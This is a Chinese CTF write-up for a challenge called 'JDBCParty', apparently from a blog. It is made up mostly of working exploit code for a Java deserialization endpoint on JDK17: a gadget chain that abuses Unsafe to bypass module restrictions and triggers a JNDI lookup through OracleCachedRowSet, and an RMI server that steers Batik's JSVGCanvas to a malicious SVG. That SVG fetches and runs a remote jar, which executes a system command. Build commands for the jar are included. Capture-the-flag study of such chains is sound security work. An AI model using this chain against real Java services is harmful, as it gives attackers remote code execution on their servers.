# 系统安全防护赛-JDBCParty

  
  
&lt;!--more--&gt;  
## 0x00 解题记录  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502032133560.png)
`/dbtest`存在反序列化，这里直接打这条链子  
https://xz.aliyun.com/news/14169  
不过是JDK17的，需要修改一下  
## 0x01 JDK17反序列化  
https://forum.butian.net/share/3748  
http://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/  
https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/  
Poc  
```java  
import org.apache.batik.swing.JSVGCanvas;    
import com.fasterxml.jackson.databind.node.POJONode;    
import oracle.jdbc.rowset.OracleCachedRowSet;    
import sun.misc.Unsafe;    
import org.apache.catalina.users.MemoryUserDatabaseFactory;    
import javax.swing.event.EventListenerList;    
import javax.swing.undo.UndoManager;    
import java.io.ByteArrayInputStream;    
import java.io.ByteArrayOutputStream;    
import java.io.ObjectInputStream;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Array;    
import java.lang.reflect.Constructor;    
import java.lang.reflect.Field;    
import java.util.Base64;    
import java.util.HashMap;    
import java.util.Vector;    
    
public class poc {    
    public static void main(String[] args) throws Exception {    
    
        Class unsafeClass = Class.forName(&#34;sun.misc.Unsafe&#34;);    
    
        Field field = unsafeClass.getDeclaredField(&#34;theUnsafe&#34;);    
        field.setAccessible(true);    
        Unsafe unsafe = (Unsafe) field.get(null);    
        Module baseModule = Object.class.getModule();    
        Class currentClass = poc.class;    
        long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField(&#34;module&#34;));    
        unsafe.getAndSetObject(currentClass, addr, baseModule);    
        OracleCachedRowSet oracleCachedRowSet = new OracleCachedRowSet();    
    
        oracleCachedRowSet.setDataSourceName(&#34;rmi://127.0.0.1:1099/Object&#34;);    
    
        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(&#34;monitorLock&#34;),null);    
        Vector vector1 = new Vector();    
        vector1.add(0,&#34;111&#34;);    
        Vector vector2 = new Vector();    
        vector2.add(0,&#34;222&#34;);    
        String[] metaData= new String[]{&#34;111&#34;,&#34;222&#34;};    
    
        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(&#34;matchColumnIndexes&#34;),vector1);    
        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(&#34;matchColumnNames&#34;),vector2);    
        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(&#34;metaData&#34;),metaData);    
        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(&#34;reader&#34;),null);    
        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(&#34;writer&#34;),null);    
        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(&#34;syncProvider&#34;),null);    
    
        POJONode pojoNode = new POJONode(oracleCachedRowSet);    
    
        EventListenerList list = new EventListenerList();    
        UndoManager manager = new UndoManager();    
        Vector vector = (Vector) getFieldValue(manager, &#34;edits&#34;);    
        vector.add(pojoNode);    
        setFieldValue(list, &#34;listenerList&#34;, new Object[]{InternalError.class, manager});    
        String payload = base64Encode(serialize(list));    
        System.out.println(payload);    
        deserialize(base64Decode(payload));    
    
    }    
    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {    
        Field field = null;    
        try {    
            field = clazz.getDeclaredField(fieldName);    
            field.setAccessible(true);    
        } catch (NoSuchFieldException ex) {    
            if (clazz.getSuperclass() != null) {    
                field = getField(clazz.getSuperclass(), fieldName);    
            }    
        }    
        return field;    
    }    
    public static Object getFieldValue(Object obj, String fieldName) throws Exception{    
        Field field = null;    
        Class c = obj.getClass();    
        for (int i = 0; i &lt; 5; i&#43;&#43;) {    
            try {    
                field = c.getDeclaredField(fieldName);    
            } catch (NoSuchFieldException e){    
                c = c.getSuperclass();    
            }    
        }    
        field.setAccessible(true);    
        return field.get(obj);    
    }    
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{    
        Field dField = obj.getClass().getDeclaredField(field);    
        dField.setAccessible(true);    
        dField.set(obj, val);    
    }    
    //HashMap打Spring的原生toString链    
    public static HashMap&lt;Object, Object&gt; makeMap (Object v1, Object v2 ) throws Exception {    
        HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();    
        setFieldValue(s, &#34;size&#34;, 2);    
        Class&lt;?&gt; nodeC;    
        try {    
            nodeC = Class.forName(&#34;java.util.HashMap$Node&#34;);    
        }    
        catch ( ClassNotFoundException e ) {    
            nodeC = Class.forName(&#34;java.util.HashMap$Entry&#34;);    
        }    
        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);    
        nodeCons.setAccessible(true);    
    
        Object tbl = Array.newInstance(nodeC, 2);    
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));    
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));    
        setFieldValue(s, &#34;table&#34;, tbl);    
        return s;    
    }    
    
    public static byte[] base64Decode(String base64) {    
        Base64.Decoder decoder = Base64.getDecoder();    
        return decoder.decode(base64);    
    }    
    
    public static String base64Encode(byte[] bytes) {    
        Base64.Encoder encoder = Base64.getEncoder();    
        return encoder.encodeToString(bytes);    
    }    
    
    public static byte[] serialize(final Object obj) throws Exception {    
        ByteArrayOutputStream btout = new ByteArrayOutputStream();    
        ObjectOutputStream objOut = new ObjectOutputStream(btout);    
        objOut.writeObject(obj);    
        return btout.toByteArray();    
    }    
    
    public static Object deserialize(final byte[] serialized) throws Exception {    
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);    
        ObjectInputStream objIn = new ObjectInputStream(btin);    
        return objIn.readObject();    
    
    }    
}  
```  
UnsafeTools  
```java  
import java.lang.reflect.Field;    
import java.lang.reflect.Method;    
import sun.misc.Unsafe;    
    
public class UnSafeTools {    
    static Unsafe unsafe;    
    
    public UnSafeTools() {    
    }    
    
    public static Unsafe getUnsafe() throws Exception {    
        Field field = Unsafe.class.getDeclaredField(&#34;theUnsafe&#34;);    
        field.setAccessible(true);    
        unsafe = (Unsafe)field.get((Object)null);    
        return unsafe;    
    }    
    
    public static void setObject(Object o, Field field, Object value) {    
        unsafe.putObject(o, unsafe.objectFieldOffset(field), value);    
    }    
    
    public static Object newClass(Class c) throws InstantiationException {    
        Object o = unsafe.allocateInstance(c);    
        return o;    
    }    
    
    public static void bypassModule(Class src, Class dst) throws Exception {    
        Unsafe unsafe = getUnsafe();    
        Method getModule = dst.getDeclaredMethod(&#34;getModule&#34;);    
        getModule.setAccessible(true);    
        Object module = getModule.invoke(dst);    
        long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField(&#34;module&#34;));    
        unsafe.getAndSetObject(src, addr, module);    
    }    
    
    static {    
        try {    
            Field field = Unsafe.class.getDeclaredField(&#34;theUnsafe&#34;);    
            field.setAccessible(true);    
            unsafe = (Unsafe)field.get((Object)null);    
        } catch (Exception var1) {    
            System.out.println(&#34;Error: &#34; &#43; var1);    
        }    
    
    }    
}  
```  
## 0x02 JDK高版本绕过JNDI  
这里需要实现RCE，需要用`org.apache.batik.swing.JSVGCanvas.setURI`方法，而我们的`lib`中恰好存在此方法，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502032204761.png)
直接打即可  
https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html  
`calc.svg`  
```xml  
&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;100&#34; height=&#34;100&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34;&gt;    
  &lt;script type=&#34;application/java-archive&#34; xlink:href=&#34;http://127.0.0.1:81/exp.jar&#34;&gt;    
  &lt;/script&gt;&lt;/svg&gt;  
```  
`RMIServer`  
```java  
import com.sun.jndi.rmi.registry.ReferenceWrapper;    
import org.apache.naming.ResourceRef;    
    
import javax.naming.NamingException;    
import javax.naming.StringRefAddr;    
import java.rmi.AlreadyBoundException;    
import java.rmi.RemoteException;    
import java.rmi.registry.LocateRegistry;    
import java.rmi.registry.Registry;    
    
public class RMIServer {    
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {    
        Registry registry = LocateRegistry.createRegistry( 1099);    
    
        ResourceRef ref = new ResourceRef(&#34;org.apache.batik.swing.JSVGCanvas&#34;, null, &#34;&#34;, &#34;&#34;,    
                true,&#34;org.apache.naming.factory.BeanFactory&#34;,null);    
    
        ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;URI=test&#34;));    
    
        ref.add(new StringRefAddr(&#34;URI&#34;, &#34;http://127.0.0.1:7001/calc.svg&#34;));    
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);    
        registry.bind(&#34;Object&#34;, referenceWrapper);    
    }    
    
}  
```  
成功实现RCE  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502032208408.png)
## 0x03 制作恶意Jar文件  
可以在`loadScript()`中看到`jar`文件的要求  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502032210199.png)
`SVGHandler`  
```java  
import org.w3c.dom.svg.EventListenerInitializer;    
import org.w3c.dom.svg.SVGDocument;    
    
public class SVGHandler implements EventListenerInitializer {    
    public SVGHandler() {}    
    @Override    
    public void initializeEventListeners(SVGDocument svgDocument) {    
        try{    
            Runtime.getRuntime().exec(&#34;open -a Calculator&#34;);    
        }catch(Exception e){    
    
        }    
    }    
}  
```  
`META-INF/MANIFEST.MF`  
```MF  
Manifest-Version: 1.0    
SVG-Handler-Class: SVGHandler  
  
```  
  
```bash  
javac -cp lib/xml-apis-ext-1.3.04.jar SVGHandler.java  
jar cmf META-INF/MANIFEST.MF evil.jar SVGHandler.class  
```  
## Reference  
https://tttang.com/archive/1405  
https://paper.seebug.org/942/  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E8%B5%9B-jdbcparty/  

